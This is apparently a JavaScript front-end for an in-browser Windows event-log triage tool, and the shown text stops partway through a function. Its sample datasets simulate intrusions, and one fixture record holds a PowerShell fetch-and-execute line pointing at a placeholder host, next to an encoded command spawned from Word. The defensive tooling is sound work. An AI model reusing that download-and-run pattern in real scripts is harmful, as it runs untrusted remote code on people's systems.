/* All parsing, scoring, and rendering happen in this browser tab. No network APIs are used. */
(() => {
  'use strict';

  const csvHeader = 'Level,Date and Time,Source,Event ID,Task Category,User,Computer,Keywords,Message';
  const sampleRows = {
    normal: [
      ['Information','2026-10-11 09:00:00','Microsoft-Windows-Security-Auditing','4624','Logon','NORTHWIND\\maya','WS-014','Audit Success','Account Name: maya; Logon Type: 2; Workstation Name: WS-014; Source Network Address: -'],
      ['Information','2026-10-11 09:05:00','Microsoft-Windows-Security-Auditing','4688','Process Creation','NORTHWIND\\maya','WS-014','Audit Success','New Process Name: C:\\Windows\\System32\\notepad.exe; Creator Process Name: C:\\Windows\\explorer.exe; Account Name: maya'],
      ['Information','2026-10-11 09:18:00','Microsoft-Windows-Security-Auditing','4624','Logon','NORTHWIND\\opsadmin','SRV-02','Audit Success','Account Name: opsadmin; Logon Type: 10; Workstation Name: SRV-02; Source Network Address: 192.0.2.25'],
      ['Information','2026-10-11 09:20:00','Microsoft-Windows-Security-Auditing','4726','User Account Management','NORTHWIND\\opsadmin','SRV-02','Audit Success','Target Account Name: retired-demo; Subject Account Name: opsadmin']
    ],
    password: [
      ...Array.from({length:6},(_,i)=>['Warning',`2026-10-11 10:0${i}:00`,'Microsoft-Windows-Security-Auditing','4625','Logon','NORTHWIND\\jordan','WS-UNKNOWN','Audit Failure',`Account Name: jordan; Workstation Name: WS-UNKNOWN; Source Network Address: 198.51.100.42; Failure Reason: Unknown user name or bad password`]),
      ['Information','2026-10-11 10:08:00','Microsoft-Windows-Security-Auditing','4624','Logon','NORTHWIND\\jordan','WS-UNKNOWN','Audit Success','Account Name: jordan; Logon Type: 3; Workstation Name: WS-UNKNOWN; Source Network Address: 198.51.100.42']
    ],
    account: [
      ['Information','2026-10-11 11:00:00','Microsoft-Windows-Security-Auditing','4720','User Account Management','NORTHWIND\\itadmin','DC-01','Audit Success','A user account was created. Target Account Name: temp-maint; Subject Account Name: itadmin'],
      ['Information','2026-10-11 11:04:00','Microsoft-Windows-Security-Auditing','4732','Security Group Management','NORTHWIND\\itadmin','DC-01','Audit Success','A member was added to a security-enabled local group. Member Account Name: temp-maint; Group Name: Administrators; Subject Account Name: itadmin']
    ],
    mixed: [
      ...Array.from({length:5},(_,i)=>['Warning',`2026-10-11 12:0${i}:00`,'Microsoft-Windows-Security-Auditing','4625','Logon','NORTHWIND\\alex','WS-UNKNOWN','Audit Failure','Account Name: alex; Workstation Name: WS-UNKNOWN; Source Network Address: 203.0.113.77; Failure Reason: Unknown user name or bad password']),
      ['Information','2026-10-11 12:06:00','Microsoft-Windows-Security-Auditing','4624','Logon','NORTHWIND\\alex','WS-UNKNOWN','Audit Success','Account Name: alex; Logon Type: 3; Workstation Name: WS-UNKNOWN; Source Network Address: 203.0.113.77'],
      ['Information','2026-10-11 12:15:00','Microsoft-Windows-Security-Auditing','4720','User Account Management','NORTHWIND\\alex','DC-01','Audit Success','A user account was created. Target Account Name: svc-cache; Subject Account Name: alex'],
      ['Information','2026-10-11 12:18:00','Microsoft-Windows-Security-Auditing','4732','Security Group Management','NORTHWIND\\alex','DC-01','Audit Success','Member Account Name: svc-cache; Group Name: Administrators; Subject Account Name: alex'],
      ['Warning','2026-10-11 12:30:00','Microsoft-Windows-Security-Auditing','1102','Audit Log','NORTHWIND\\alex','DC-01','Audit Success','The audit log was cleared. Subject Account Name: alex'],
      ['Information','2026-10-11 12:35:00','Service Control Manager','7045','Service Control Manager','SYSTEM','DC-01','Information','A service was installed. Service Name: DemoUpdater; Service File Name: C:\\Program Files\\DemoUpdater\\demo.exe']
    ]
  };
  sampleRows.advanced = [
    ...Array.from({ length: 5 }, (_, i) => ['Warning', '2026-10-15 09:0' + i + ':00', 'Microsoft-Windows-Security-Auditing', '4625', 'Logon', '', 'DC-01', 'Audit Failure', 'Target Account Name: demo-user-' + i + '; Target Account Domain: NORTHWIND; Source Network Address: 198.51.100.50; Logon Type: 3']),
    ['Information', '2026-10-15 09:06:00', 'Microsoft-Windows-Security-Auditing', '4740', 'Account', 'SYSTEM', 'DC-01', 'Audit Success', 'Target Account Name: demo-user-0; Caller Computer Name: LAB-01'],
    ['Information', '2026-10-15 09:07:00', 'Microsoft-Windows-Security-Auditing', '4648', 'Logon', 'NORTHWIND\\maya', 'WS-014', 'Audit Success', 'Target Account Name: demo-admin; Target Server Name: SRV-02; Process Name: C:\\Windows\\System32\\runas.exe'],
    ['Information', '2026-10-15 09:08:00', 'Microsoft-Windows-Security-Auditing', '4688', 'Process', 'NORTHWIND\\maya', 'WS-014', 'Audit Success', 'New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; Creator Process Name: C:\\Program Files\\Microsoft Office\\WINWORD.EXE; Process Command Line: powershell.exe -EncodedCommand RABFAE0ATwA='],
    ['Information', '2026-10-15 09:09:00', 'Microsoft-Windows-PowerShell', '4104', 'Script block', 'NORTHWIND\\maya', 'WS-014', 'Information', 'ScriptBlock ID: fictional-script-001; Script Block Text: Invoke-WebRequest https://example.invalid/demo.txt | Invoke-Expression'],
    ['Information', '2026-10-15 09:10:00', 'Microsoft-Windows-Security-Auditing', '4698', 'Task', 'NORTHWIND\\opsadmin', 'SRV-02', 'Audit Success', 'Task Name: \\DemoMaintenance; Task Content: <Task><Actions><Exec><Command>demo-agent.exe</Command></Exec></Actions></Task>'],
    ['Information', '2026-10-15 09:11:00', 'Microsoft-Windows-Security-Auditing', '4702', 'Task', 'NORTHWIND\\opsadmin', 'SRV-02', 'Audit Success', 'Task Name: \\DemoMaintenance'],
    ['Information', '2026-10-15 09:12:00', 'Microsoft-Windows-Security-Auditing', '4719', 'Audit policy', 'NORTHWIND\\opsadmin', 'DC-01', 'Audit Success', 'Subcategory: Logon; Audit Policy Changes: Failure removed'],
    ['Information', '2026-10-15 09:13:00', 'Microsoft-Windows-Security-Auditing', '4946', 'Firewall', 'SYSTEM', 'SRV-02', 'Audit Success', 'Rule Name: Demo application; Rule ID: fictional-rule-001; Profile Changed: Domain'],
    ['Information', '2026-10-15 09:14:00', 'Microsoft-Windows-Security-Auditing', '4950', 'Firewall', 'SYSTEM', 'SRV-02', 'Audit Success', 'Setting Type: Default outbound action; Setting Value: Allow; Profile Changed: Domain']
  ];
  const sampleNames = { normal: 'Normal Windows Activity', password: 'Password Guessing Scenario', account: 'Account Persistence Scenario', mixed: 'Mixed SOC Scenario', advanced: 'Correlation and Policy Lab' };
  const { normalizeSettings, DEFAULT_SETTINGS, severityOrder, eventSort,
    labelById, eventCatalog, logonTypes, accountDisplay, correlationCoverage } = window.EventTriageAnalysis;
  const reports = window.EventTriageReports;
  const cases = window.EventTriageCases;
  const inputs = window.EventTriageInputs, profiles = window.EventTriageProfiles;
  const collection = window.EventTriageCollection;
  const runner = new window.EventTriageTasks.TaskRunner();
  const ids = ['csv-file','file-name','analyze-button','parse-status','drop-zone','failure-threshold','auth-window','spray-threshold','account-window','reset-settings','report','report-title','dataset-tag','summary-banner','coverage-note','metrics','findings','finding-count','finding-sort','findings-prev','findings-next','findings-page','top-accounts','top-failures','common-ids','event-search','filter-id','filter-severity','filter-ip','filter-type','event-rows','visible-count','timeline','timeline-title','timeline-prev','timeline-next','timeline-page','event-panel','events-title','evidence-scope','evidence-title','evidence-back','show-all-events','clear-filters','event-sort','page-size','page-first','page-prev','page-next','page-last','page-label','event-reference','cancel-task','task-progress','settings','case-title','case-analyst','case-timezone','case-notes','case-status','export-scope','export-json','export-findings','export-events','export-status'];
  const els = Object.fromEntries(ids.map(id => [id, document.getElementById(id)]));
  els['processing-bar'] = document.getElementById('processing-bar'); els['task-label'] = document.getElementById('task-label');
  for(const id of ['rule-profile-file','reset-rule-profile','download-rule-profile','rule-profile-status','rule-catalog'])els[id]=document.getElementById(id);
  for(const id of ['reopen-case-file','reopen-status','save-case'])els[id]=document.getElementById(id);
  for(const id of ['filter-source','filter-duplicates','source-summary','source-list','rule-coverage-summary','rule-coverage-list'])els[id]=document.getElementById(id);
  const settingIds = { failureThreshold: 'failure-threshold', authWindowMinutes: 'auth-window', sprayAccountThreshold: 'spray-threshold', accountWindowMinutes: 'account-window' };
  const filterIds = ['event-search','filter-id','filter-severity','filter-ip','filter-type','filter-source','filter-duplicates'];
  const caseIds = { title:'case-title', analyst:'case-analyst', collectionTimezone:'case-timezone', notes:'case-notes' };
  const FINDING_PAGE_SIZE = 20, TIMELINE_PAGE_SIZE = 100;
  const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
  let selectedFile = '', currentEvents = [], currentFindings = [], activeEvidenceId = null;
  let page = 0, findingPage = 0, timelinePage = 0, taskToken = 0, busy = false, dirtyNotes = false, noteRevision = 0;
  let eventPriorities = new Map(), relatedFindings = new Map(), eventByUid = new Map();
  let diagnostics = {}, source = {}, analysisSettings = DEFAULT_SETTINGS, analyzedAt = null, annotations = Object.create(null);
  let caseContext = reports.normalizeCase(), orderedFindings = [], noteworthy = [], viewCache = null, searchTimer;
  let currentProfile = profiles.defaultProfile, analysisProfile = profiles.defaultProfile;
  let caseOrigin = null, datasetBytes = 0;
  let currentRuleCoverage = [], duplicateRecords = new Map();

  const escapeHtml = value => String(value ?? '').replace(/[&<>"']/g, c => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;' }[c]));
  const csvEscape = value => '"' + String(value).replaceAll('"', '""') + '"';
  const makeCsv = rows => [csvHeader, ...rows.map(row => row.map(csvEscape).join(','))].join('\r\n');
  const displayTime = event => (event.timeText || 'Time unavailable').slice(0,500);
  const sourceLabel = event => (event.inputFormat === 'json' ? 'JSON record ' + event.sourceRecord : event.inputFormat === 'xml' ? 'XML line ' + event.sourceLine : event.inputFormat === 'jsonl' ? 'JSON line ' + event.sourceLine : 'CSV row ' + event.lineNumber) +
    (source.files?.length > 1 ? ' · '+event.sourceName+' ['+event.sourceId+']' : '');
  const preview = value => String(value ?? '').length > 20000 ? String(value).slice(0,20000) + '\n[Preview shortened; full value is preserved in JSON and events CSV.]' : String(value ?? '');
  const pairHtml = (label, value) => '<dt>' + escapeHtml(label) + '</dt><dd>' + escapeHtml(preview(value || 'Not available')) + '</dd>';
  const scrollTo = (element, block = 'start') => element.scrollIntoView({ behavior: 'auto', block });
  function setStatus(message, error = false) {
    els['parse-status'].textContent = message; els['parse-status'].classList.toggle('error', error);
    els['task-label'].textContent = message;
    els['csv-file'].setAttribute('aria-invalid', error ? 'true' : 'false');
  }
  function settings() {
    const values = normalizeSettings(Object.fromEntries(Object.entries(settingIds).map(([key, id]) => [key, els[id].value])));
    for (const [key, id] of Object.entries(settingIds)) els[id].value = String(values[key]);
    return values;
  }
  function setBusy(value) {
    busy = value;
    els['processing-bar'].hidden = !value;
    els.report.inert = value;
    els['task-progress'].hidden = !value; els['cancel-task'].hidden = !value;
    els.report.setAttribute('aria-busy', String(value)); els['drop-zone'].setAttribute('aria-busy', String(value));
    els['analyze-button'].disabled = value || !currentEvents.length;
    for (const id of [...Object.values(settingIds),'reset-settings','rule-profile-file','reset-rule-profile','download-rule-profile','reopen-case-file','save-case','export-json','export-findings','export-events'])
      els[id].disabled = value || ((id.startsWith('export-') || id === 'save-case') && !analyzedAt);
  }
  function invalidateView() { viewCache = null; }
  function resetFilters() { clearTimeout(searchTimer); for (const id of filterIds) els[id].value = ''; page = 0; invalidateView(); }
  function resetCase() {
    caseContext = reports.normalizeCase(); annotations = Object.create(null); dirtyNotes = false;
    for (const [key,id] of Object.entries(caseIds)) els[id].value = caseContext[key];
    updateCaseStatus();
  }
  function updateCaseStatus() {
    const values = Object.entries(annotations).filter(([,value]) => value.note || value.status !== 'Unreviewed');
    const inactive = values.filter(([id]) => !currentFindings.some(finding => finding.id === id)).length;
    els['case-status'].textContent = (dirtyNotes ? 'Notes changed in this tab. Export JSON to keep them. ' : 'Notes are not stored automatically. ') +
      values.length + ' annotated finding(s).' + (inactive ? ' ' + inactive + ' are outside the current analysis and are retained in JSON exports.' : '');
  }
  function mayReplaceDataset() {
    return !dirtyNotes || window.confirm('This starts a new case and clears notes in this tab. Export JSON first if you need to keep them. Continue?');
  }
  function cancelTask() {
    taskToken += 1; runner.cancel(); setBusy(false);
    setStatus('Operation cancelled.' + (currentEvents.length ? ' The previously loaded dataset is still available.' : ' Choose an event export to begin.'));
    if (els['export-status'].textContent === 'Preparing download…') els['export-status'].textContent = 'Download preparation cancelled.';
    els['csv-file'].value = '';
    if (analyzedAt) for (const [key,id] of Object.entries(settingIds)) els[id].value = String(analysisSettings[key]);
    if(analyzedAt){currentProfile=analysisProfile;renderRuleProfile();}
    els['analyze-button'].focus();
  }
  async function processInput(payload, name, metadata = {}) {
    const token = ++taskToken; runner.cancel();
    setBusy(true); setStatus('Reading event export…');
    try {
      const result = await runner.run(payload.files ? 'parse-files' : 'parse', payload, message => { if (token === taskToken) setStatus(message); });
      if (token !== taskToken) return;
      currentEvents = result.events; currentFindings = []; selectedFile = name; diagnostics = result.diagnostics;
      source = result.source || { name, sizeBytes: payload.bytes || payload.file?.size || 0, lastModified: metadata.lastModified || null, loadedAt: new Date().toISOString(), kind: metadata.kind || result.format, format:result.format };
      selectedFile = source.name; currentRuleCoverage = [];
      datasetBytes = source.sizeBytes; caseOrigin = null; els['reopen-status'].textContent = '';
      analyzedAt = null; activeEvidenceId = null; page = findingPage = timelinePage = 0;
      eventByUid = new Map(currentEvents.map(event => [event.uid,event]));
      eventPriorities = new Map(); relatedFindings = new Map();
      resetFilters(); resetCase();
      els['event-sort'].value = 'csv'; els['finding-sort'].value = 'priority'; els['export-scope'].value = 'all';
      els.report.hidden = true; els['file-name'].textContent = selectedFile; els['export-status'].textContent = '';
      const d = diagnostics, rows = [...d.blankEventIdRows, ...d.invalidEventIdRows].sort((a,b) => a-b);
      const timestampRows = [...d.ambiguousTimestampRows, ...d.invalidTimestampRows, ...d.missingTimestampRows].sort((a,b) => a-b);
      const describe = values => values.slice(0,8).join(', ') + (values.length > 8 ? ' and ' + (values.length - 8) + ' more' : '');
      const location=result.format==='csv'?'CSV row(s)':result.format==='json'?'JSON record(s)':result.format.toUpperCase()+' line(s)';
      const warnings = source.files?.length > 1 ? (d.files || []).filter(file => file.rowsSkipped || file.invalidTimestamps || file.ambiguousTimestamps || file.missingTimestamps)
        .map(file => source.files.find(item => item.id === file.sourceId).name+' ['+file.sourceId+']: '+file.rowsSkipped+' unreadable Event ID(s), '+(file.invalidTimestamps+file.ambiguousTimestamps+file.missingTimestamps)+' timestamp(s) needing review.').join(' ') : '';
      setStatus(d.rowsParsed + ' events parsed from ' + (source.files?.length > 1 ? source.files.length+' files' : result.format.toUpperCase()) + '.' +
        (source.files?.length > 1 ? ' '+warnings : (rows.length ? ' Skipped unreadable Event IDs in '+location+' ' + describe(rows) + '.' : '') +
        (timestampRows.length ? ' Timestamp review needed in '+location+' ' + describe(timestampRows) + '; timed correlations exclude those records.' : '') +
        '') + (d.duplicateEvents ? ' '+d.duplicateEvents+' confirmed overlapping record(s) retained and excluded from rules.' : '') +
        ' Select Analyse events to build the report.');
    } catch (error) {
      if (token === taskToken && error.name !== 'AbortError') setStatus(error.message || 'Could not read this event export.', true);
    } finally { if (token === taskToken) { setBusy(false); els['csv-file'].value = ''; } }
  }
  async function loadFiles(selection) {
    const files = Array.from(selection || []).map(file => ({file,name:file.name}));
    if (!files.length) return;
    let bytes;try { bytes=collection.validateFiles(files); } catch(error) { setStatus(error.message,true);els['csv-file'].value='';return; }
    if (!mayReplaceDataset()) { els['csv-file'].value = ''; return; }
    await processInput({files,bytes},files.length === 1 ? files[0].name : files.length+' event exports');
  }
  async function runAnalysis(focusReport = false) {
    if (!currentEvents.length) return;
    const token = ++taskToken, effectiveSettings = settings();
    setBusy(true); setStatus('Correlating events…');
    try {
      const result = await runner.run('analyze', { events: currentEvents, settings: effectiveSettings, ruleProfile:currentProfile, bytes: datasetBytes,includeCoverage:true },
        message => { if (token === taskToken) setStatus(message); });
      if (token !== taskToken) return;
      analysisSettings = effectiveSettings; analysisProfile=currentProfile; analyzedAt = new Date().toISOString();
      currentRuleCoverage = result.ruleCoverage; indexFindings(result.findings); render(); updateCaseStatus();
      setStatus('Triage report ready. ' + currentFindings.length + ' findings. Check the correlation coverage note.');
      setBusy(false);
      if (focusReport) { scrollTo(els['report-title']); els['report-title'].focus({ preventScroll: true }); }
    } catch (error) {
      if (token === taskToken && error.name !== 'AbortError') {
        if (analyzedAt) for (const [key,id] of Object.entries(settingIds)) els[id].value = String(analysisSettings[key]);
        if(analyzedAt){currentProfile=analysisProfile;renderRuleProfile();}
        setStatus(error.message, true);
      }
    }
    finally { if (token === taskToken) setBusy(false); }
  }
  function indexFindings(result) {
    currentFindings = result.map(({ eventUids, ...finding }) => ({ ...finding, events:eventUids.map(uid => eventByUid.get(uid)) }));
    if (!currentFindings.some(finding => finding.id === activeEvidenceId)) activeEvidenceId = null;
    eventPriorities = new Map(); relatedFindings = new Map();
    duplicateRecords = new Map();
    for (const event of currentEvents) if (event.duplicateOf) {
      if (!duplicateRecords.has(event.duplicateOf)) duplicateRecords.set(event.duplicateOf,[]);
      duplicateRecords.get(event.duplicateOf).push(event);
    }
    for (const finding of currentFindings) for (const event of finding.events) {
      if (!relatedFindings.has(event.uid)) relatedFindings.set(event.uid, []);
      relatedFindings.get(event.uid).push(finding);
      const previous = eventPriorities.get(event.uid);
      if (!previous || severityOrder[finding.severity] < severityOrder[previous]) eventPriorities.set(event.uid,finding.severity);
    }
    orderedFindings = reports.sortFindings(currentFindings,els['finding-sort'].value);
    noteworthy = [...new Map(currentFindings.flatMap(finding => finding.events).map(event => [event.uid,event])).values()].sort(eventSort);
    invalidateView();
  }
  async function reopenSavedCase(file) {
    if (!file || busy) return;
    if (!file.name.toLowerCase().endsWith('.json') || file.size > cases.MAX_BYTES) {
      els['reopen-status'].textContent = 'Choose a saved-case JSON file up to 50 MB.'; els['reopen-case-file'].value = ''; return;
    }
    if (!mayReplaceDataset()) { els['reopen-case-file'].value = ''; return; }
    const token = ++taskToken; runner.cancel(); setBusy(true); setStatus('Validating and reopening saved case…');
    try {
      const result = await runner.run('reopen-case',{file,bytes:file.size,browserTimezone},message => { if (token === taskToken) setStatus(message); });
      if (token !== taskToken) return;
      currentEvents = result.events; eventByUid = new Map(currentEvents.map(event => [event.uid,event]));
      source = result.source; selectedFile = source.name; datasetBytes = Math.max(source.sizeBytes,file.size);
      diagnostics = result.diagnostics; currentProfile = analysisProfile = result.ruleProfile; analysisSettings = result.settings;
      for (const [key,id] of Object.entries(settingIds)) els[id].value = String(analysisSettings[key]);
      caseContext = result.case; annotations = result.annotations; dirtyNotes = false; noteRevision += 1;
      for (const [key,id] of Object.entries(caseIds)) els[id].value = caseContext[key];
      caseOrigin = { ...result.origin,fileName:file.name }; analyzedAt = new Date().toISOString();
      activeEvidenceId = null; page = findingPage = timelinePage = 0; resetFilters();
      els['event-sort'].value = 'csv'; els['finding-sort'].value = 'priority'; els['export-scope'].value = 'all';
      els['file-name'].textContent = selectedFile; els['export-status'].textContent = '';
      currentRuleCoverage = result.ruleCoverage; indexFindings(result.findings); renderRuleProfile(); render(); updateCaseStatus();
      els['reopen-case-file'].setAttribute('aria-invalid','false');
      els['reopen-status'].textContent = 'Reopened '+file.name+'. '+result.notices.join(' ');
      setStatus('Saved case reopened: '+currentEvents.length+' events. Evidence, notes, settings, and rule profile restored.');
      els['report-title'].focus({preventScroll:true});
    } catch (error) {
      if (token === taskToken && error.name !== 'AbortError') {
        els['reopen-case-file'].setAttribute('aria-invalid','true');
        els['reopen-status'].textContent = error.message;
        setStatus('Saved case was not opened. The current case remains available.');
      }
    } finally { if (token === taskToken) { setBusy(false); els['reopen-case-file'].value = ''; } }
  }
  function render() {
    els.report.hidden = false; els['dataset-tag'].textContent = selectedFile || 'UPLOADED DATA';
    const high = currentFindings.filter(finding => finding.severity === 'High').length;
    els['summary-banner'].textContent = currentFindings.length ?
      currentFindings.length + ' findings from ' + currentEvents.length + ' events; ' + high + ' need high-priority review.' :
      'No configured rule fired. Review event coverage and surrounding evidence before reaching a conclusion.';
    const coverage = correlationCoverage(currentEvents);
    els['coverage-note'].textContent = 'Correlation coverage: ' + coverage.authenticationExcluded +
      ' authentication records lack a usable time, target identity, reporting host, or source; ' + coverage.accountChangesExcluded +
      ' account/group records lack a usable time, target identity, or host. These records remain in the event table. Timed matches require timestamps with a time of day and the same timezone basis.' +
      (coverage.incompleteScripts ? ' ' + coverage.incompleteScripts + ' PowerShell records are marked as fragments; complete scripts may require other records.' : '');
    const counts = new Map();
    for (const event of currentEvents.filter(event => !event.duplicateOf)) counts.set(event.id, (counts.get(event.id) || 0) + 1);
    const duplicates = currentEvents.filter(event => event.duplicateOf).length;
    const metrics = [['Total records', currentEvents.length], ['Records assessed', currentEvents.length-duplicates], ['Confirmed duplicates',duplicates], ['Successful logons', counts.get('4624') || 0], ['Failed logons', counts.get('4625') || 0],
      ['Accounts created', counts.get('4720') || 0], ['Group additions', (counts.get('4728') || 0) + (counts.get('4732') || 0)],
      ['Audit-log clearing', counts.get('1102') || 0], ['Process creation', counts.get('4688') || 0], ['Findings to review', currentFindings.length]];
    els.metrics.innerHTML = metrics.map(([label,value]) => '<div class="metric"><span>' + escapeHtml(label) + '</span><strong>' + value + '</strong></div>').join('');
    renderSources(); renderCoverage(); renderFindings(); renderSnapshots(); renderFilters(); renderTimeline(); renderTable();
  }
  function renderSources() {
    const files = source.files || [{id:'source-1',name:source.name,format:source.format}];
    const duplicates = currentEvents.filter(event => event.duplicateOf).length;
    els['source-summary'].textContent = files.length+' source file(s) · '+currentEvents.length+' original records · '+duplicates+' confirmed duplicates excluded from rules.'+
      (files.length > 1 && diagnostics.uncomparableEvents ? ' '+diagnostics.uncomparableEvents+' records lack the identity needed for duplicate comparison and were kept.' : '');
    els['source-list'].innerHTML = files.map(file => {
      const events = currentEvents.filter(event => event.sourceId === file.id || !event.sourceId && files.length === 1);
      const diagnostic = diagnostics.files?.find(item => item.sourceId === file.id);
      return '<li><strong>'+escapeHtml(file.name)+'</strong> <span class="muted">['+escapeHtml(file.id)+'] · '+escapeHtml(file.format?.toUpperCase())+' · '+events.length+' records · '+events.filter(event => event.duplicateOf).length+' duplicates'+
        (diagnostic ? ' · '+diagnostic.rowsSkipped+' skipped unreadable IDs' : '')+'</span></li>';
    }).join('');
  }
  function renderCoverage() {
    const labels = {disabled:'Disabled','no-events':'No relevant events','insufficient-data':'Insufficient data',partial:'Partly assessed',assessed:'Assessed'};
    const counts = new Map(); for (const item of currentRuleCoverage) counts.set(item.state,(counts.get(item.state)||0)+1);
    els['rule-coverage-summary'].textContent = [...counts].map(([state,count]) => count+' '+labels[state].toLowerCase()).join(' · ')+'. Coverage uses the entire collection, excluding confirmed duplicates.';
    els['rule-coverage-list'].innerHTML = currentRuleCoverage.map(item => '<details class="rule-coverage-item"><summary><span>'+escapeHtml(item.title)+' <small>'+escapeHtml(item.ruleId)+'</small></span><span class="coverage-state">'+labels[item.state]+'</span></summary>'+
      '<p>'+escapeHtml(item.explanation)+'</p><p class="muted small">'+item.relevantEvents+' relevant · '+item.eligibleEvents+' with required fields · '+item.excludedEvents+' with field gaps · '+item.findingCount+' emitted finding(s).</p>'+
      '<p><strong>Required:</strong> '+item.requirements.map(escapeHtml).join('; ')+'.</p>'+
      (item.missingFields.length ? '<ul>'+item.missingFields.map(gap => '<li>'+escapeHtml(gap.field)+': '+gap.events+' record(s); examples '+gap.exampleEventUids.map(escapeHtml).join(', ')+'.</li>').join('')+'</ul>' : '')+
      (item.missingEventTypes.length ? '<p>Missing companion events: '+item.missingEventTypes.map(escapeHtml).join('; ')+'.</p>' : '')+
      item.warnings.map(warning => '<p class="muted small">'+escapeHtml(warning)+'</p>').join('')+
      '<details><summary>Collection and logging context</summary><ul>'+item.collectionHints.map(hint => '<li>'+escapeHtml(hint.eventId+' · '+hint.channel+' · '+hint.audit)+'</li>').join('')+'</ul></details></details>').join('');
  }
  function pager(prefix, pageIndex, size, total) {
    const last = Math.max(0, Math.ceil(total / size) - 1);
    els[prefix + '-prev'].disabled = pageIndex === 0; els[prefix + '-next'].disabled = pageIndex === last;
    els[prefix + '-page'].textContent = total ? (pageIndex * size + 1) + '–' + Math.min((pageIndex + 1) * size,total) + ' of ' + total : 'None';
  }
  function renderFindings() {
    findingPage = Math.max(0,Math.min(findingPage,Math.ceil(orderedFindings.length / FINDING_PAGE_SIZE) - 1));
    els['finding-count'].textContent = String(currentFindings.length);
    pager('findings',findingPage,FINDING_PAGE_SIZE,orderedFindings.length);
    if (!orderedFindings.length) {
      els.findings.innerHTML = '<p class="empty-state">No configured rule fired. Check the coverage note and available evidence.</p>'; return;
    }
    els.findings.innerHTML = orderedFindings.slice(findingPage * FINDING_PAGE_SIZE,(findingPage + 1) * FINDING_PAGE_SIZE).map(finding => {
      const review = reports.normalizeAnnotation(annotations[finding.id]);
      return '<article class="finding-card sev-' + finding.severity.toLowerCase() + '" id="finding-' + finding.id + '" tabindex="-1">' +
      '<div class="finding-top"><h4>' + escapeHtml(finding.title) + '</h4><span class="severity ' + finding.severity.toLowerCase() + '">' + finding.severity + ' review priority</span></div>' +
      '<p class="finding-meta">RULE ' + finding.ruleId + ' · ' + finding.score + ' priority points · ' + finding.events.length + ' supporting event(s)</p>' +
      '<p>' + escapeHtml(finding.why) + '</p>' +
      '<button type="button" class="button button-secondary evidence-button" data-evidence="' + finding.id + '">View ' + finding.events.length + ' supporting event(s)</button>' +
      '<details><summary>Matched fields and score breakdown</summary><dl class="match-fields">' +
      finding.matchedFields.map(item => pairHtml(item.label, item.value)).join('') + '</dl>' +
      '<ul>' + finding.scoreBreakdown.map(item => '<li>+' + item.points + ' · ' + escapeHtml(item.label) + '</li>').join('') +
      '</ul><p>Priority points are assigned per rule. Overlapping findings share evidence and are not added into a dataset risk score.</p></details>' +
      '<details><summary>Benign explanations and investigation steps</summary><p>' + escapeHtml(finding.benign) + '</p><ol>' +
      finding.next.map(step => '<li>' + escapeHtml(step) + '</li>').join('') + '</ol></details>' +
      '<details class="review-notes"' + (review.note || review.status !== 'Unreviewed' ? ' open' : '') + '><summary>Analyst review · ' + escapeHtml(review.status) + '</summary>' +
      '<label for="status-' + finding.id + '">Review status<select id="status-' + finding.id + '" data-review-status="' + finding.id + '">' +
      reports.statuses.map(status => '<option' + (review.status === status ? ' selected' : '') + '>' + status + '</option>').join('') + '</select></label>' +
      '<label for="note-' + finding.id + '">Finding note<textarea id="note-' + finding.id + '" data-review-note="' + finding.id + '" rows="3" maxlength="4000">' +
      escapeHtml(review.note) + '</textarea></label></details></article>';
    }).join('');
  }
  function selectEvidence(id) {
    if (!currentFindings.some(item => item.id === id)) return;
    activeEvidenceId = id; resetFilters(); renderTable();
    scrollTo(els['event-panel']); els['evidence-back'].focus({ preventScroll: true });
  }
  function focusFinding(id) {
    const index = orderedFindings.findIndex(finding => finding.id === id);
    if (index < 0) return;
    const targetPage = Math.floor(index / FINDING_PAGE_SIZE);
    if (targetPage !== findingPage) { findingPage = targetPage; renderFindings(); }
    const card = document.getElementById('finding-' + id);
    if (card) { scrollTo(card,'center'); card.focus({ preventScroll: true }); }
  }
  function snapshot(id, title, items) {
    els[id].innerHTML = '<div class="snapshot-block"><h4>' + escapeHtml(title) + '</h4>' +
      (items.length ? '<ul>' + items.map(([name,value]) => '<li><span>' + escapeHtml(name) + '</span><strong>' + value + '</strong></li>').join('') + '</ul>' : '<p class="muted small">No data available</p>') + '</div>';
  }
  function renderSnapshots() {
    const accounts = new Map(), failures = new Map(), counts = new Map();
    for (const event of currentEvents.filter(event => !event.duplicateOf)) {
      const name = event.account || event.accountSid ? accountDisplay(event) : '';
      if (name) accounts.set(name,(accounts.get(name) || 0) + 1);
      if (name && event.id === '4625') failures.set(name,(failures.get(name) || 0) + 1);
      counts.set(event.id,(counts.get(event.id) || 0) + 1);
    }
    const top = map => [...map].sort((a,b) => b[1]-a[1] || a[0].localeCompare(b[0])).slice(0,5);
    snapshot('top-accounts','Top affected accounts',top(accounts));
    snapshot('top-failures','Accounts with failed logons',top(failures));
    snapshot('common-ids','Most common Event IDs',top(counts).map(([id,value]) => [id + ' · ' + (labelById[id] || 'Other event'),value]));
  }
  function renderFilters() {
    for (const [id,values,label] of [
      ['filter-id',[...new Set(currentEvents.map(event => event.id))].sort((a,b) => Number(a)-Number(b)),'All event IDs'],
      ['filter-type',[...new Set(currentEvents.map(event => labelById[event.id] || 'Other event'))].sort(),'All event types']
    ]) {
      const previous = els[id].value;
      els[id].innerHTML = '<option value="">' + label + '</option>' + values.map(value =>
        '<option value="' + escapeHtml(value) + '">' + escapeHtml(id === 'filter-id' ? value + ' · ' + (labelById[value] || 'Other event') : value) + '</option>').join('');
      els[id].value = values.includes(previous) ? previous : '';
    }
    const selected = els['filter-source'].value;
    els['filter-source'].innerHTML = '<option value="">All source files</option>'+(source.files || []).map(file => '<option value="'+escapeHtml(file.id)+'">'+escapeHtml(file.name+' ['+file.id+']')+'</option>').join('');
    els['filter-source'].value = (source.files || []).some(file => file.id === selected) ? selected : '';
  }
  function eventDetails(event) {
    const pairs = [
      ['Source filename',event.sourceName || source.name],['Source file ID',event.sourceId],['Windows record ID',event.eventRecordId],['Event channel',event.channel],
      ['Duplicate handling',event.duplicateOf ? 'Confirmed duplicate of '+event.duplicateOf+'; retained here and excluded from rules.' : 'Included in rule analysis'],
      ['Target account',event.account || event.accountSid ? accountDisplay(event) : ''],['Target SID',event.accountSid],['Actor',event.actor],
      ['Reporting host',event.computer],['Source IP',event.ip],['Workstation / caller',event.workstation],
      ['Timestamp interpretation',event.timestampStatus + (event.hasTime ? '' : '; no time of day')],['Timezone basis',event.timeBasis],
